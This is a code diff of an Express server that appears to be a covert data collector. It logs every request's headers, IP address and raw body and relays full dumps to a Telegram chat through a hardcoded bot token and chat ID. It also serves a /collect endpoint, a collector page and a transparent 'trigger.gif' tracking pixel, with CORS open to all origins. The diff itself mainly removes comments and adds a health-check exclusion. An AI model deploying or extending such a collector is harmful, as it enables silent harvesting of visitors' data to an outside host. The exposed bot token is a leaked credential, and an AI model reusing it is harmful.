@@ -4,13 +4,14 @@ const path = require('path');
 const axios = require('axios');
 
 const app = express();
-app.use(bodyParser.json({ type: '*/*' })); // Capture any JSON body
-app.use(bodyParser.text({ type: '*/*', limit: '5mb' })); // Also capture raw text bodies
+app.use(bodyParser.json({ type: '*/*' }));
+app.use(bodyParser.text({ type: '*/*', limit: '5mb' }));
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Headers', '*');
   next();
 });
+
 // Telegram config
 const TELEGRAM_BOT_TOKEN = '8748740739:AAE--7CFFMibv2GlcPEcebw8_uDD-D9C5xM';
 const TELEGRAM_CHAT_ID = '1903358250';
@@ -35,7 +36,7 @@ async function telegramMessage(text) {
   }
 }
 
-// Capture raw body early (before any other middleware that might consume it)
+// Capture raw body early
 app.use((req, res, next) => {
   const chunks = [];
   req.on('data', d => chunks.push(d));
@@ -45,12 +46,16 @@ app.use((req, res, next) => {
   });
 });
 
-// Log everything + notify Telegram
+// Log everything + notify Telegram (with exclusion)
 app.use((req, res, next) => {
+  // Exclude Render health checks
+  if (req.url === '/api/vault/status' && req.headers['render-health-check'] === '1') {
+    return next();
+  }
+
   const timestamp = new Date().toISOString();
   const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown';
 
-  // Build a full request dump
   let report = `*Full Request Dump*\n`;
   report += `*Timestamp:* ${timestamp}\n`;
   report += `*IP:* ${ip}\n`;
@@ -59,7 +64,6 @@ app.use((req, res, next) => {
   for (const [k, v] of Object.entries(req.headers)) {
     report += `${k}: ${v}\n`;
   }
-  // Include raw body if present (base64 to avoid binary issues)
   if (req.rawBody && req.rawBody.length > 0) {
     const preview = req.rawBody.length <= 1024 ? req.rawBody.toString('utf8') : req.rawBody.slice(0, 1024).toString('utf8') + '... (truncated)';
     report += `\n*Raw Body (preview):*\n\`\`\`\n${preview}\n\`\`\`\n`;
@@ -72,13 +76,11 @@ app.use((req, res, next) => {
   console.log('Headers:', req.headers);
   if (req.rawBody && req.rawBody.length > 0) console.log('Raw body length:', req.rawBody.length);
 
-  // Send to Telegram
   telegramMessage(report).catch(() => {});
-
   next();
 });
 
-// Collect endpoint (still parses JSON if possible)
+// Collect endpoint
 app.post('/collect', (req, res) => {
   const timestamp = new Date().toISOString();
   let parsed = {};
@@ -91,7 +93,6 @@ app.post('/collect', (req, res) => {
   console.log('Parsed payload:', parsed);
   console.log('==================');
 
-  // Telegram detailed collect payload
   let collectReport = `*Collect Endpoint Payload*\n`;
   collectReport += `*Timestamp:* ${timestamp}\n`;
   collectReport += `*Parsed JSON:* ${JSON.stringify(parsed, null, 2)}\n`;
@@ -101,7 +102,6 @@ app.post('/collect', (req, res) => {
   collectReport += `*User-Agent:* ${userAgent}\n`;
 
   telegramMessage(collectReport).catch(() => {});
-
   res.sendStatus(200);
 });
 
@@ -110,7 +110,7 @@ app.get('/collector.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'collector.html'));
 });
 
-// Serve a 1x1 transparent GIF for image triggers
+// Serve a 1x1 transparent GIF
 app.get('/trigger.gif', (req, res) => {
   const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
   res.setHeader('Content-Type', 'image/gif');
@@ -118,7 +118,7 @@ app.get('/trigger.gif', (req, res) => {
   console.log('[trigger.gif] Served transparent pixel');
 });
 
-// Serve a visible button GIF (you can replace with your own 120x30 GIF)
+// Serve a visible button GIF
 app.get('/button.gif', (req, res) => {
   const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
   res.setHeader('Content-Type', 'image/gif');
@@ -126,7 +126,7 @@ app.get('/button.gif', (req, res) => {
   console.log('[button.gif] Served button pixel');
 });
 
-// Debug page (optional)
+// Debug page
 app.get('/debug', (req, res) => {
   res.send(`
     <h2>Debug Console</h2>
@@ -139,7 +139,7 @@ app.get('/debug', (req, res) => {
   `);
 });
 
-// Simple SSE stream for live debug view (optional)
+// Simple SSE stream for live debug view
 app.get('/debug-stream', (req, res) => {
   res.setHeader('Content-Type', 'text/event-stream');
   res.flushHeaders();
